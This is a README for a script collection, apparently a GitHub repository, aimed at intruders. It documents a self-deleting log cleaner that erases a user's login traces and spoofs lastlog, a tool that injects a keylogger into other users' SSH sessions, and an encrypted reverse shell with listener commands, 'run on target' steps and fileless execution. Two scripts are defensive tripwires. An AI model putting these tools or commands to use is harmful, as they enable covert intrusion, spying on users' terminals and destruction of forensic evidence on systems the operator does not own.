# ghost-protocol

A collection of operational security and reconnaissance scripts for the discerning freedom fighter.
Originally authored by [@JusticeRage](https://github.com/JusticeRage), modified by [@moscovium-mc](https://github.com/moscovium-mc).

All scripts are Python 3.8+ compatible. All tools require Linux unless otherwise noted.

Distributed under the [GPL v3 License](https://www.gnu.org/licenses/gpl.html). Contributions welcome.

---

## Table of Contents

- [nojail.py](#nojailpy) - stealthy log sanitizer
- [share.sh](#sharesh) - encrypted file transfer
- [autojack.py](#autojackpy) - SSH session logger
- [listurl.py](#listurlpy) - multi-threaded site mapper
- [ersh.py](#ershpy) - encrypted reverse shell
- [boot_check.py](#boot_checkpy) - evil-maid attack detector
- [notify_hook.py](#notify_hookpy) - binary tripwire / alert system

---

## nojail.py

Stealthy log cleaner. Removes incriminating entries from:

- `/var/run/utmp`, `/var/log/wtmp`, `/var/log/btmp` (`who`, `w`, `last`)
- `/var/log/lastlog` (`lastlog`)
- `/var/**/*.log`, `.log.1`, `.log.N.gz` (text logs, including gzipped rotations)
- Any additional file or directory you specify

Entries are matched by IP address and/or hostname. The file descriptor trick keeps
syslog/journald writing without noticing the tampering. Scratch work lives in
`/dev/shm` and is securely wiped afterwards.

**Changes from v1:**
- Full Python 3 rewrite
- `shred`-backed secure delete with manual fallback
- gzip log support (scrubs rotated/compressed logs automatically)
- `--daemonize` waits for the SSH session to end, then fires
- Lastlog spoofing uses the real prior session rather than zeroing out

### Usage

```
./nojail.py [-h] [-u USER] [-i IP] [--hostname HOSTNAME]
            [-r REGEXP] [-v] [-c] [-d] [-s]
            [log_files ...]

optional arguments:
  -u, --user USER        Username to ghost (default: $USER)
  -i, --ip IP            Source IP to erase (default: $SSH_CONNECTION)
  --hostname HOSTNAME    Hostname to erase (default: rDNS of IP)
  -r, --regexp REGEXP    Extra regex to match lines for deletion
  -v, --verbose          More output
  -c, --check            Confirm each deletion
  -d, --daemonize        Background: clean when session ends. Implies -s.
  -s, --self-delete      Shred this script after execution
```

### Example

```
./nojail.py --user root --ip 151.80.119.32 /etc/app/logs/access.log --check
```

### Disclaimer

No guarantees. Don't blame the code for things you shouldn't have done in the first place.

---

## share.sh

Portable encrypted file transfer via [transfer.sh](https://transfer.sh).

- AES-256-CBC + PBKDF2 (10 000 iterations, SHA-256)
- Auto-detects `torsocks` / `torify` for anonymity
- Scratch file lives in `/dev/shm` (no disk trace) with secure wipe on exit
- Works with `curl` or `wget`, whichever is available

**Changes from v1:**
- Modern `openssl -pbkdf2 -iter 10000 -md sha256` (no more legacy `-k` mode)
- `/dev/shm` scratch space
- 3-pass manual wipe when `shred` isn't available
- Randomised remote filename to avoid fingerprinting

### Usage

```bash
# Upload
./share.sh [-m max_downloads] [-d days] <file> "encryption_key"

# Download
./share.sh -r <output_file> "encryption_key" <URL>
```

---

## autojack.py

Watches `auth.log` / `secure` for new SSH logins and injects
[shelljack](https://github.com/emptymonkey/shelljack) into the user's shell process,
logging the full terminal session.

Root sessions are excluded by default (`EXCLUDED_USERS`).

**Changes from v1:**
- Full Python 3 rewrite
- Log rotation detection (inode-based)
- Recursive process-tree walker (`pgrep -P`) handles PAM helpers and sshd multiplexing
- Configurable shell targets (`bash`, `zsh`, `fish`, `sh`, `dash`)
- Startup prerequisite checks

### Usage

```bash
# Run from a screen session
screen -S autojack
./autojack.py
```

Sessions are logged to `/root/.local/sj.log.<user>.<timestamp>`.

---

## listurl.py

Multi-threaded website crawler. Discovers URLs by recursively following links.
Useful for attack surface mapping and bug-bounty recon.

**Changes from v1:**
- Full Python 3 rewrite (`queue`, `urllib.parse`)
- Modern `requests` retry adapter (handles 429 / 5xx gracefully)
- Updated User-Agent
- Cleaner interrupt handling (CTRL+C drains queues before printing results)
- Fixed `SSLError` handling (no more `.message` attribute)

### Usage

```
./listurl.py -u https://target.com [options]

  -m MAX_DEPTH      Crawl depth (default: 3)
  -t THREADS        Worker threads (default: 10)
  -u URL            Start URL (required)
  -e                Follow external links
  -d                Include subdomains
  -c COOKIE         Add a cookie: -c "session=abc". Repeatable.
  -r REGEXP         Exclude URLs matching this pattern
  -s REGEXP         Only show URLs matching this pattern
  -n                Disable SSL certificate verification
  -o OUTPUT_FILE    Write results to file
  --timeout SECS    Per-request timeout (default: 10)
  -v                Verbose (repeat for more)
```

### Example

```
./listurl.py -u https://manalyzer.org --exclude-regexp "/report/"
```

---

## ersh.py

Encrypted reverse shell in pure Python 3. No compiled dependencies.
Mutual TLS 1.3 authentication - both ends verify each other.

**Changes from v1:**
- Replaced deprecated `ssl.wrap_socket` with `ssl.SSLContext` + TLS 1.3 minimum
- Certs written to `/dev/shm`-backed temp files and immediately shredded after handshake
- Daemonize now redirects stdio to `/dev/null`
- Fixed `e.message` → `str(e)` throughout
- `FIRST_COMMAND` unsets more history-related env vars

### Setup

**Generate certs (on your listener machine):**
```bash
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
  -subj "/C=US/ST=Maryland/L=Fort Meade/O=NSA/CN=www.nsa.gov" \
  -keyout server.key -out server.crt && \
  cat server.key server.crt > server.pem && \
  openssl dhparam 2048 >> server.pem

openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
  -subj "/C=US/ST=Maryland/L=Fort Meade/O=NSA/CN=www.nsa.gov" \
  -keyout client.key -out client.crt
```

**Edit `ersh.py`:** fill in `HOST`, `PORT`, and paste the cert contents into
`client_key`, `client_crt`, `server_crt`.

**Start the listener:**
```bash
socat openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt,openssl-min-proto-version=TLS1.3 \
  file:`tty`,raw,echo=0
```

**Run on target:**
```bash
python3 ersh.py
```

**Or fileless (from a non-interactive shell):**
```bash
python3 - <<'EOF'
[paste script here]
EOF
```

---

## boot_check.py

Detects evil-maid attacks by monitoring hard drive power-cycle counts via SMART data.
If the drive was powered on more times than the OS booted, someone may have been
copying your drive.

**Changes from v1:**
- Uses `shutil.which()` instead of broken `subprocess.Popen(["command", "-v", ...], shell=True)`
- f-strings throughout
- `Optional` return types, cleaner function signatures
- SMART parsing handles both legacy and modern `smartctl -A` output

### Installation

```bash
apt install smartmontools dialog

cp boot_check.service /etc/systemd/system/
# Edit the ExecStart path inside it

systemctl enable boot_check.service
./boot_check.py   # initialise the baseline
```

---

## notify_hook.py

Tripwire system for monitored binaries. Symlink this script over any binary you
want to watch (`id`, `whoami`, `gcc`, `curl`, …). When a user runs the binary,
an alert fires silently and the real binary is executed transparently.

**Changes from v1:**
- Multiple notification backends: **Signal**, **Slack**, **Discord**, generic **HTTP webhook**, and **syslog** fallback
- Uses `os.execv` to replace the hook process with the real binary - no extra entry in `ps` output
- Fixed `e.message` → `str(e)` in fork helpers
- `shutil.which()` for binary discovery
- Searches PATH directories, skipping `/local/` to avoid self-referential loops

### Setup

```bash
# Trap 'id'
ln -s /path/to/notify_hook.py /usr/local/bin/id

# Edit CALLER_WHITELIST to suppress alerts from cron, nagios, etc.
# Edit notify_callback() to configure your alert channel.
```

---

## Dependencies

```bash
pip install -r requirements.txt
apt install smartmontools dialog  # for boot_check.py
```

[shelljack](https://github.com/emptymonkey/shelljack) is required for `autojack.py` (external binary).

---

*Coded with love by @JusticeRage. Dragged into the modern era by @moscovium-mc.*
